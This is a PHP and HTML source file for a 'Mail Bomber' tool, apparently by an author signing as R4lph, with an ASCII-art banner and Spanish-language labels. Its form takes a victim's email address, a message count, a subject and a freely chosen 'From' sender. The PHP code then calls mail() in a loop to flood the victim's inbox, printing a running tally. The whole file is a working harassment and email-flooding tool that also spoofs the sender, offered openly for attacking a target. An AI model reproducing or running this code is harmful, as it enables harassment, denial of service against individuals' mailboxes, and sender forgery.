<html><body bgcolor=black>
  <center>
    <pre><font color="white" style="text-shadow: 5px 5px 10px  #00FF40">
      _______   __    __  _______         __       __   ______   ______  __        ________  _______   __
      /       \ /  |  /  |/       \       /  \     /  | /      \ /      |/  |      /        |/       \ /  |
      $$$$$$$  |$$ |  $$ |$$$$$$$  |      $$  \   /$$ |/$$$$$$  |$$$$$$/ $$ |      $$$$$$$$/ $$$$$$$  |$$ |
      $$ |__$$ |$$ |__$$ |$$ |__$$ |      $$$  \ /$$$ |$$ |__$$ |  $$ |  $$ |      $$ |__    $$ |__$$ |$$ |
      $$    $$/ $$    $$ |$$    $$/       $$$$  /$$$$ |$$    $$ |  $$ |  $$ |      $$    |   $$    $$< $$ |
      $$$$$$$/  $$$$$$$$ |$$$$$$$/        $$ $$ $$/$$ |$$$$$$$$ |  $$ |  $$ |      $$$$$/    $$$$$$$  |$$/
      $$ |      $$ |  $$ |$$ |            $$ |$$$/ $$ |$$ |  $$ | _$$ |_ $$ |_____ $$ |_____ $$ |  $$ | __
      $$ |      $$ |  $$ |$$ |            $$ | $/  $$ |$$ |  $$ |/ $$   |$$       |$$       |$$ |  $$ |/  |
      $$/       $$/   $$/ $$/             $$/      $$/ $$/   $$/ $$$$$$/ $$$$$$$$/ $$$$$$$$/ $$/   $$/ $$/

      Make by R4lph, Contact: @RslphManga

    </pre></font>
    </html>
    <html>
    <head><title>Mail Bomber By R4lph</title>
      <body bgcolor="black">
        <style type="text/css">
        body,td,th {
          color: lime;
        }
      </style>
      <div align=center>
        <form action="" method="post">
          Correo de la victima:<input type="text" name="email" /></br>
          Cantidades?:<input type="text" name="amount" /></br>
          Sujeto:<input type="text" name="subject" /></br>
          Enviado por:<input type="text" name="from" /></br>
          Mensaje:<br><textarea rows="10" name="message" cols="60" style="font-family: Courier New; background-color: #FFFFFF; color: #003D60; border: thin outset">Mensaje</textarea><br><input type="submit" />
        </form>
      </body>
      </html>
      <html>
      <head><title>Mail Bomber By R4lph</title>
        <body bgcolor="black">
          <style type="text/css">
          body,td,th {
            color: Lime;
          }
        </style>
        <div align=center><?php

        $a = $_POST["email"];
        $sujeto = $_POST["subject"];
        $mensaje = $_POST["message"];
        $de = $_POST["from"];
        $headers = "From: $de";
        $i=0;
        $amount = $_POST["amount"];
        do
        {
          mail($a,$sujeto,$mensaje,$headers);
          $i++;
          echo "Se han enviado $i Correos a $a<br />";
        }
        while ($i<$amount);
        ?>
